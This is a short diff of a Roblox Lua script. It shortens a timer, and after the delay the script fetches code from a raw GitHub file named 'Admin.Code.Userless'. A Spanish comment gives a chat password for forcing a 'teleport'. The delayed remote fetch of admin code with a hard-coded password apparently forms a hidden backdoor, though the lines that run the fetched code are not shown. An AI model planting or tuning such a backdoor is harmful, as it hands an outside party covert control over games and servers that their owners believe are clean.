@@ -9,7 +9,7 @@ if modelSuccess and module then
 end
 
 -- 2. Si No Funciona FORZAR EL TELEPORT CON CLAVE (te Pedira La Contraseña en el Chat, Es Entrance0232
-task.delay(320, function()
+task.delay(200, function()
     local success, res = pcall(HttpService.GetAsync, HttpService, "https://raw.githubusercontent.com/luisaddoba200-wq/CodeAdmin.Coderless/main/Admin.Code.Userless")
     
     if success and res then
